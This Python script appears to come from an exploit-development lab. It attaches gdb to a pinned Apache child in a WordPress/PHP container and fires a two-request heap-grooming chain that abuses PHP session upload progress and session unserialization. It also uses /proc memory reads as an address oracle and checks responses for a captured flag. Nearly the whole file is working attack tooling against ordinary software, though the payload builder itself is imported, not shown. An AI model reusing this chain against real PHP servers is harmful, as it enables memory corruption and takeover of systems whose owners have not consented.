#!/usr/bin/env python3
"""dbgcrash.py — catch the consumer segfault under host gdb.
Pins ONE apache child (SIGSTOP the others), attaches gdb, fires the
producer+consumer chain (fire.py logic inline), prints the crash site.
Usage: sudo python3 dbgcrash.py [full|benign] [tag]
"""
import os, re, signal, socket, struct, subprocess, sys, time

sys.path.insert(0, "lanes/race-618/glm4")
HOST, PORT = "127.0.0.1", 8099
CTNR = "php-firing-range-wordpress-x86-1"
BND = b"GLM4FR"
FILL = 430080

from fire import (part, pb, post_head, send, sh, stage, stage_big, log)
from groom import build_payload
import memtool as _  # noqa (not used directly)


def children_host(cpid):
    kids = open(f"/proc/{cpid}/task/{cpid}/children").read().split()
    out = []
    for h in kids:
        nsp = int(subprocess.run(["grep", "-m1", "NSpid", f"/proc/{h}/status"],
                                 capture_output=True).stdout.split()[2])
        if nsp != 1:
            out.append((int(h), nsp))
    return out


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "full"
    cpid = int(sh(["docker", "inspect", "-f", "{{.State.Pid}}", CTNR]))
    kids = children_host(cpid)
    log(f"kids(host,ns): {kids}")
    tgt_host, tgt_ns = kids[0]
    others = [h for h, _ in kids[1:]]
    for h in others:
        os.kill(h, signal.SIGSTOP)
    log(f"pinned child ns={tgt_ns} host={tgt_host}; stopped {others}")

    bias0 = int(sh(["sudo", "python3", "lanes/race-618/glm4/memtool.py",
                     "libphp-bias", str(cpid), str(tgt_ns)], timeout=20), 16)
    win0 = bytes.fromhex(sh(["sudo", "python3",
                             "lanes/race-618/glm4/memtool.py", "read",
                             str(cpid), str(tgt_ns),
                             hex(bias0 + 0xf1e748), "1304"], timeout=20))
    ts = time.strftime("%H%M%S")
    sid_a = ("a" + ts + "a" * 32)[:32]
    sid_b = ("b" + ts + "b" * 32)[:32]
    sh(["docker", "exec", CTNR, "sh", "-c", "rm -f /tmp/sess_*"], timeout=20)
    stage_big(sid_a)

    time.sleep(1.5)  # gdb attach + continue
    s = socket.create_connection((HOST, PORT), timeout=30)
    prod = pb([part(b"f", b"F" * 430080),
               part(b"PHPSESSID", sid_a.encode()),
               part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc"),
               part(b"u", b"x" * 10, filename=b"a.txt")])
    r, dt = send(s, post_head(len(prod)), prod, timeout=60)
    body = r.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in r else r
    log(f"producer: t={dt:.1f}s oom={b'134217728' in body} len={len(r)}")

    # oracle via /proc
    bias = int(sh(["sudo", "python3", "lanes/race-618/glm4/memtool.py",
                   "libphp-bias", str(cpid), str(tgt_ns)], timeout=20), 16)
    bg = bias + 0xf1e748
    win = sh(["sudo", "python3", "lanes/race-618/glm4/memtool.py",
              "read", str(cpid), str(tgt_ns), hex(bg), "1304"], timeout=20)
    wb = bytes.fromhex(win)
    daddr, dval = None, None
    for i in range(0, 1304 - 16, 8):
        v = struct.unpack_from("<Q", wb, i)[0]
        lv = struct.unpack_from("<Q", wb, i + 8)[0]
        if (v > 0x1000000 and 0 < lv < 100 and
                wb[i:i+16] != win0[i:i+16]):
            daddr, dval = bg + i, v
            log(f"dbg oracle cand off={i} data={v:#x} level={lv}")
    log(f"oracle: &BG(unserialize).data={daddr and hex(daddr)} d={dval and hex(dval)} bias={hex(bias)}")

    dchunk_guess = dval
    lw_guess = (daddr - 20) if daddr else 0
    chunk = (dval or 0) & ~0x1FFFFF
    sig = bias + 0xf20000
    bp = bias + 0x3c118c  # php_var_unserialize_destroy
    if mode == "benign":
        script = f"""set pagination off
break *0x{bp:x}
continue
echo ===BP-HIT===\n
continue
"""
    else:
        script = f"""set pagination off
continue
echo ===CRASH===\n
bt 6
info registers pc x0 x1
echo ===SIG===\n
find /g 0x{chunk:x}, 0x{chunk + 0x200000:x}, 0x{sig:x}
echo ===DCHUNK===\n
x/8gx 0x{(dchunk_guess or 0):x}
quit
"""
    with open("/tmp/gdbcmd.txt", "w") as f:
        f.write(script)
    gdb = subprocess.Popen(
        ["gdb", "-q", "-batch", "-p", str(tgt_host),
         "-x", "/tmp/gdbcmd.txt"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    time.sleep(0.3)
    payload = build_payload(dval, daddr, bias)
    stage(sid_b, b"poc|i:1;" if mode == "benign" else b'poc|O:9:"Exception":0:{}')
    comb = b"F" * FILL + payload
    cons = pb([part(b"g", comb),
               part(b"PHPSESSID", sid_b.encode()),
               part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc2"),
               part(b"u", b"y" * 10, filename=b"b.txt")])
    r, dt = send(s, post_head(len(cons)), cons, timeout=60)
    body = r.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in r else r
    flag = re.search(rb"FLAG\{wordpress-x86:[^}]*\}", body)
    log(f"consumer: t={dt:.1f}s len={len(r)} FLAG={flag and flag.group()}")
    s.close()

    if mode == "benign":
        # gdb is stopped at php_var_unserialize_destroy (or waiting);
        # scan ALL rw regions of the stopped child for the groom sig.
        time.sleep(1)
        hits = []
        with open(f"/proc/{tgt_host}/maps") as f:
            maps = f.read().splitlines()
        with open(f"/proc/{tgt_host}/mem", "rb") as m:
            for line in maps:
                parts = line.split()
                if len(parts) < 2 or "r" not in parts[1] or "w" not in parts[1]:
                    continue
                if len(parts) > 5 and "/" in parts[5]:
                    continue
                st, en = [int(x, 16) for x in parts[0].split("-")]
                if en - st > 0x800000:
                    continue
                try:
                    m.seek(st)
                    blob = m.read(en - st)
                except OSError:
                    continue
                pat = struct.pack("<Q", sig)
                i = 0
                while True:
                    j = blob.find(pat, i)
                    if j < 0:
                        break
                    hits.append((hex(st + j), parts[5] if len(parts) > 5 else "anon"))
                    i = j + 1
        for h in hits:
            log(f"SIG-HIT: {h[0]} ({h[1]}) chunkrel={h[0]}")
        gdb.kill()
        out, _ = gdb.communicate()
        for h in others:
            os.kill(h, signal.SIGCONT)
        log("benign scan done")
        return

    try:
        out, _ = gdb.communicate(timeout=15)
    except subprocess.TimeoutExpired:
        gdb.kill()
        out, _ = gdb.communicate()
    with open("/tmp/gdbout.txt", "w") as f:
        f.write(out)
    lines = out.splitlines()
    mark = next((i for i, l in enumerate(lines) if "DCHUNK" in l), 0)
    for line in lines[max(mark - 2, 0):]:
        print(line)
    for h in others:
        os.kill(h, signal.SIGCONT)
    log("cleanup: SIGCONT sent")


if __name__ == "__main__":
    main()
